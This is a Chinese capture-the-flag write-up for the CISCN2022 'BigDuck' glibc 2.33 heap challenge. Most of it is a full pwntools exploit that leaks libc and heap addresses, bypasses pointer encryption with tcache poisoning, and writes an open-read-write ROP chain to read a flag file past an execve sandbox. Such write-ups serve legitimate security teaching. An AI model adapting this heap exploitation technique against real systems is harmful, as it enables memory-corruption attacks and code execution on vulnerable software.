### CISCN2022 BigDuck Write Up

该题目附件我已经上传到Github，有需要的可以下载，复现这题时，我是使用的NSSCTF提供的远程环境。

此题是一道libc2.33的题，其实和Duck那题差不多，只不过开了沙箱，禁用了execve，那么我们只需要orw去读取flag就行了。2.33的chunk的fd指针也都采用了异或加密，如何应对加密，在Duck那题中已经说过了，这里就不再赘述，不懂的可以去看我Duck那篇题解。



利用思路和duck相同，只不过最后的ROP链换成orw的ROP链就行了。

最终exp如下：

```python
from pwn import *
#io=process('./pwn')
io=remote('1.14.71.254',28230)
elf=ELF('./pwn')
libc=ELF('./libc.so.6')

context(arch='amd64', os='linux')

m_hook=libc.sym['__malloc_hook']

def add():
    io.recvuntil('Choice: ')
    io.sendline('1')

def delete(index):
    io.recvuntil('Choice: ')
    io.sendline('2')
    io.recvuntil('Idx: \n')
    io.sendline(str(index))

def show(index):
    io.recvuntil('Choice: ')
    io.sendline('3')
    io.recvuntil('Idx: \n')
    io.sendline(str(index))

def edit(index,size,content):
    io.recvuntil('Choice: ')
    io.sendline('4')
    io.recvuntil('Idx: \n')
    io.sendline(str(index))
    io.recvuntil('Size: \n')
    io.sendline(str(size))
    io.recvuntil('Content: \n')
    io.sendline(content)


for i in range(9):
    add()

for i in range(8):
    delete(i)  


edit(7,0x1,b'\x01')
show(7)

main_arena = u64(io.recv(6).ljust(8, b'\x00'))
main_arena = main_arena-96-0x10


libc_addr= main_arena-1-m_hook

print("libc_addr: " + hex(libc_addr))
print("main_arena: " + hex(main_arena))

show(0)
heap_base=u64(io.recv(5).ljust(8,b'\x00'))
heap_base=heap_base<<12
print("heap_base: "+hex(heap_base))

for i in range(5):
    add()

environ_addr=libc_addr+libc.sym['environ']

print("environ_addr: " + hex(environ_addr))

edit(1,0x10,p64(environ_addr^(heap_base>>12))+p64(0))

add()         
add()         

show(15)
stack_addr = u64(io.recv(6).ljust(8, b'\x00'))
stack_addr = stack_addr - 0x138



print("stack_addr: "+ hex(stack_addr))


delete(9)
delete(10)
edit(10,0x10,p64(stack_addr^(heap_base>>12))+p64(0))

add()  
add()

read_addr=libc_addr+libc.sym['read']
open_addr=libc_addr+libc.sym['open']
write_addr=libc_addr+libc.sym['write']

print("read_addr" + hex(read_addr))
print("open_addr" + hex(open_addr))
print("write_addr" + hex(write_addr))

pop_rdi=libc_addr+next(libc.search(asm('pop rdi;ret;')))

pop_rsi=libc_addr+0x2a4cf
pop_rdx=libc_addr+0xc7f32

buffer=stack_addr-0x100

payload=p64(0)+p64(0)
payload=payload+b'./flag\x00'
payload=payload+p64(pop_rdi)+p64(stack_addr+0x10)+p64(pop_rsi)+p64(0)+p64(open_addr)
payload=payload+p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(buffer)+p64(pop_rdx)+p64(0x100)+p64(read_addr)
payload=payload+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(buffer)+p64(pop_rdx)+p64(0x100)+p64(write_addr)

edit(17,0x120,payload)

io.interactive()
```

